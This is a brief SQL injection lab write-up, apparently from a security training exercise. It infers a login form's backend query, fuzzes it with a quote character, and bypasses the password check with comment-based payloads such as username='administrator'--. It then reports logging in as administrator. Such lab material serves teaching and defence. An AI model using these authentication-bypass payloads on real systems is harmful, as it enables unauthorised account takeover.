SQL Injection Vulnerability - Login Functionality

Objective: Perform SQLi attack and login as the administrator user

*** Analysis ***

We can deduce the backend query to look something like below:

SELECT firstname FROM users_table WHERE username='admin' and password='admin'

*** Exploitation

- We can first fuzz the vulnerable functionality using common SQLi character as below

SELECT firstname FROM users_table WHERE username=''' and password='admin'   #Output => "Internal Server Error"

- Let's now try with a payload to attempt to login with as the admin user

#Output => Failed, admin user doesn't seem to exist

SELECT firstname FROM users_table WHERE username='admin'--' and password='admin'

#Login Successful!

SELECT firstname FROM users_table WHERE username='administrator'--' and password='admin'   

Now over to scripting the exploit
